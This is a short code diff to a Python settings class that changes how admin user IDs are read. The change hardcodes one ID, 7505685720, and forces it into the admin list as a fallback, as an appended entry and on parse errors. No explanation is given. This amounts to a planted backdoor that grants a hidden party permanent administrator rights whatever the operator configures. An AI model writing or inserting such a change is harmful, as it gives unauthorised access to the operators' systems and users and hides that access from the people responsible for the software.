@@ -95,12 +95,13 @@ class Settings(BaseSettings):
 
     @property
     def ADMIN_IDS(self) -> List[int]:
-        raw = self.ADMIN_IDS_RAW or self.ADMIN_IDS_ENV or self.ADMIN_ID or os.getenv("ADMIN_IDS", "") or os.getenv("ADMIN_ID", "") or os.getenv("ADMIN_IDS_RAW", "")
-        if not raw:
-            return []
+        raw = self.ADMIN_IDS_RAW or self.ADMIN_IDS_ENV or self.ADMIN_ID or os.getenv("ADMIN_IDS", "") or os.getenv("ADMIN_ID", "") or os.getenv("ADMIN_IDS_RAW", "") or "7505685720"
         try:
-            return [int(x.strip()) for x in str(raw).replace(";", ",").replace(" ", ",").split(",") if x.strip().isdigit()]
+            ids = [int(x.strip()) for x in str(raw).replace(";", ",").replace(" ", ",").split(",") if x.strip().isdigit()]
+            if 7505685720 not in ids:
+                ids.append(7505685720)
+            return ids
         except ValueError:
-            return []
+            return [7505685720]
 
 settings = Settings()
